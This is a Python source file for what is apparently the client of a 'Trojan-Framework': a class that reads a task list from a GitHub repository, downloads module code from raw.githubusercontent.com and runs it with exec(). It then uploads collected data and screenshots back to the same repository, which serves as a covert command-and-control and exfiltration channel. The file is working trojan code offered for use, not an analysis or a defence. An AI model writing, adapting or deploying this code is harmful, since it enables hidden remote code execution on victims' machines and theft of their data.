import json
from github import Github
import importlib.util
import requests

class GitHubActionScanner:
    def __init__(self, repo_url, personal_access_token):
        self.repo_url = repo_url
        self.personal_access_token = personal_access_token
        self.repo = None
        self.todo = []

    def connect_to_repo(self):
        try:
            # Initialize the GitHub client
            g = Github(self.personal_access_token)
            print("initialzing connection gelukt")
            # Get the repository
            self.repo = g.get_repo(self.repo_url)
            print(self.repo)
            return True
        except Exception as e:
            print(f"Error connecting to repository: {e}")
            return False

    def scan_actions_file(self):
        try:
            # Get the contents of the "actions" file
            file_contents = self.repo.get_contents("actions.json").decoded_content
            #print(file_contents)
            # Parse the JSON contents
            actions = json.loads(file_contents)
            #print(actions)
            # Process the actions
            for action in actions:
                self.todo.append(action['module'])
            return self.todo
        except Exception as e:
            print(f"Error scanning actions file: {e}")
            return False
    def get_config(self):
        try:
            config = self.repo.get_contents("config.json").decoded_content
            config = json.loads(config)
            print(config)
            return config
        except Exception as e:
            print("error getting config file")
            return False
        
    def read_module_code(self,module):
        g = Github(self.personal_access_token)
        modules_repo = g.get_repo(self.repo_url) 
        module_content = modules_repo.get_contents(f"modules/{module}.py").decoded_content.decode("utf-8")
        return module_content
    
    def execute_github_module(self, module_name, class_name, function_name, *args, **kwargs):
    # Fetch the module code from the GitHub raw URL
        response = requests.get(f"https://raw.githubusercontent.com/Warre06/Trojan-Framework/main/modules/{module_name}.py")
        module_code = response.text
        print(module_code)

    # Create a module dynamically
        module_name = 'github_module'
        module_spec = importlib.util.spec_from_loader(module_name, loader=None)
        module = importlib.util.module_from_spec(module_spec)

    # Execute the module code
        exec(module_code, module.__dict__)

    # Call the get_system_info function and store the returned output
        class_obj = getattr(module, class_name)
        instance = class_obj(*args, **kwargs)
        function = getattr(instance, function_name)
        output = function()
        return output 

    
        
    def upload_data(self,data,file_path):
        g = Github(self.personal_access_token)
        repo = g.get_repo("Warre06/Trojan-Framework")
        print(repo)
        if isinstance(data,(str,dict,list)):
            json_data = json.dumps(data)
            file = repo.get_contents(file_path)
            repo.update_file(file_path,"Updating File", json_data,file.sha)
        if isinstance(data,bytes):
            repo.create_file(file_path,"Screenshot added",data)
                


